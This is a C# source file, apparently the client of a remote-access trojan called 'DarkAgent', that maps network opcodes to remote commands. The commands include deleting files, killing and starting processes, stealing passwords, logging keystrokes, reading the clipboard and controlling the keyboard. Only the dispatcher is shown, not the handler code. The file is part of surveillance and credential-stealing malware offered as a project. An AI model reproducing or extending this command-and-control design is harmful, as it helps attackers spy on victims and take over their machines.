using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Receive;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets
{
    public class ClientPacketProcessor
    {
        private static SortedList<short, PacketType> packetList;

        public static void Initialize()
        {
            packetList = new SortedList<short, PacketType>();
            RegisterPacket(new PacketType("MessageBox",          0x0000, typeof(R_MessageBox)));
            RegisterPacket(new PacketType("Set Cursor Position", 0x0001, typeof(R_CursorPosition)));
            RegisterPacket(new PacketType("Delete File",         0x0002, typeof(R_DeleteFile)));
            RegisterPacket(new PacketType("Get Processes",       0x0003, typeof(R_GetProcesses)));
            RegisterPacket(new PacketType("Kill Processes",      0x0004, typeof(R_KillProcess)));
            RegisterPacket(new PacketType("Suspend Processes",   0x0005, typeof(R_SuspendProcess)));
            RegisterPacket(new PacketType("Resume Processes",    0x0006, typeof(R_ResumeProcess)));
            RegisterPacket(new PacketType("Change Window Text",  0x0007, typeof(R_ProcessWindowtext)));
            RegisterPacket(new PacketType("Get Process DLLs",    0x0008, typeof(R_GetProcessDLLs)));
            RegisterPacket(new PacketType("Get Process threads", 0x0009, typeof(R_GetProcessThreads)));
            RegisterPacket(new PacketType("Mod Thread",          0x0010, typeof(R_ProcessModThread)));
            RegisterPacket(new PacketType("Start Process",       0x0011, typeof(R_StartProcess)));
            RegisterPacket(new PacketType("FileMgr get drives",  0x0012, typeof(R_FileMgrGetDrives)));
            RegisterPacket(new PacketType("FileMgr get Folders", 0x0013, typeof(R_FileMgrGetFiles)));
            RegisterPacket(new PacketType("FileMgr Create File", 0x0014, typeof(R_CreateFile)));
            RegisterPacket(new PacketType("FileMgr Copy File",   0x0015, typeof(R_CopyFily)));
            RegisterPacket(new PacketType("Get cpu Info",        0x0016, typeof(R_GetCpuInfo)));
            RegisterPacket(new PacketType("Get Passwords",       0x0020, typeof(R_GetPasswords)));
            RegisterPacket(new PacketType("Get KeyStrokes",      0x0021, typeof(R_KeyStrokes)));
            RegisterPacket(new PacketType("Get Clipboard",       0x0022, typeof(R_GetClipboard)));
            RegisterPacket(new PacketType("Set Wallpaper",       0x0023, typeof(R_SetWallpaper)));
            RegisterPacket(new PacketType("Set Clipboard",       0x0024, typeof(R_SetClipboard)));
            RegisterPacket(new PacketType("Remote Keyboard",     0x0025, typeof(R_RemoteKeyboard)));
        }

        private static void RegisterPacket(PacketType packet)
        {
            packetList.Add(packet.Opcode, packet);
        }

        public static Type ProcessPacket(byte[] packet)
        {
            if (packetList.ContainsKey((short)packet[0]))
                return packetList[(short)packet[0]].Packet;
            else
                return null;
        }

        private class PacketType
        {
            public string Name { get; private set; }
            public short Opcode { get; private set; }
            public Type Packet { get; private set; }

            public PacketType(string name, short opcode, Type packet)
            {
                Name = name;
                Opcode = opcode;
                Packet = packet;
            }
        }
    }
}
